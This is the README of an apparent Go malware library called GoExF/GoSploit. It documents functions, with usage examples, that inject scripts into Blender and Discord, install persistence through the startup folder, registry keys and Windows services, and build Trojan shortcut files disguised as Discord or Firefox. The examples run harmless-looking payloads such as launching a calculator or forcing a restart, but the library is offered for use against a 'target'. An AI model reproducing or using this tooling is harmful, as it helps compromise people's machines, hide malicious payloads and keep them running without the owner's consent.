# Instalation 
`go get github.com/F-r-o-i-d/GoExF/

# Documentation
🔴 -> need Admin
🟢 -> Admin not required

⚫ -> Visible to target
⚪ -> Invisible to target

## CodeInjection
**Execute code on a target machine.**

`github.com/F-r-o-i-d/GoExF/GoExF/GoSploit/InfectApp`

#### - `InfectApp.InfectBlender(` *payload* ` )` [🔴⚪]

Injects a malicious script (batch) in blender code
### ex :
```golang
package main

import "github.com/GoExF/GoExF/GoSploit/InfectApp"

func main(){
	InfectApp.InfectBlender("start calc.exe")
}
```
___
#### - `InfectApp.InfectDiscord(` *payload* ` )` [🟢⚪]

Injects a malicious script (nodejs) in discord code

### ex :
```golang
package main

import "github.com/GoExF/GoExF/GoSploit/InfectApp"

func main(){
	InfectApp.InfectDiscord("while(true){}") // stuck discord on loading
}

```
___
## Persistance
**Make evil program stuck on the target machine.**

`github.com/GoExF/GoExF/GoSploit`

#### - `GoSploit.StartUpWdirectories()`[🟢⚫]

copy evil .exe -> shell:startup

### ex :
```golang
package main

import "github.com/GoExF/GoExF/GoSploit"

func main(){
	GoSploit.Initialize()
	GoSploit.StartUpWdirectories() 
}
```
___

#### - `GoSploit.StartUpWdregedit()`[🔴⚫]

create key regedit to launch exe at startup

### ex :
```golang
package main

import "github.com/GoExF/GoExF/GoSploit"

func main(){
	GoSploit.Initialize()
	GoSploit.StartUpWdregedit() 
}
```
___
#### - `GoSploit.StartUpWservice(ServiceName)`[🔴⚪]

create a service to launch exe at startup
### ex :
```golang
package main

import "github.com/GoExF/GoExF/GoSploit"

func main(){
	GoSploit.Initialize()
	GoSploit.StartUpWservice() 
}
```
___
## Trojan

**Make evil file hiden to look like something good.**

`import EvilFile "github.com/GoExF/GoExF/GoSploit/EvilFile"`

#### - EvilFile.Lnk [🟢⚫]

```
Discord := EvilFile.EvilLnk{
	Name:        "Discord.lnk",
	Payload:     "evilCode",
	Path:        "$home\\Desktop\\",
	Interface:   "cmd.exe / powershell.exe",
	IconPath:    "Discord.exe path / Discord.ico path",
	Description: "Discord ShortCut",
}
Discord.Build()
```
### ex :
```golang
package main

import "github.com/GoExF/GoExF/GoSploit/EvilFile"

func main(){
	Firefox := EvilFile.EvilLnk{
		Name:        "Firefox.lnk",
		Payload:     "Restart-Computer -Froce",
		Path:        "$home\\Desktop\\",
		Interface:   "powershell.exe",
		IconPath:    "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
		Description: "firefox",
	}
	Firefox.Build()
}
```
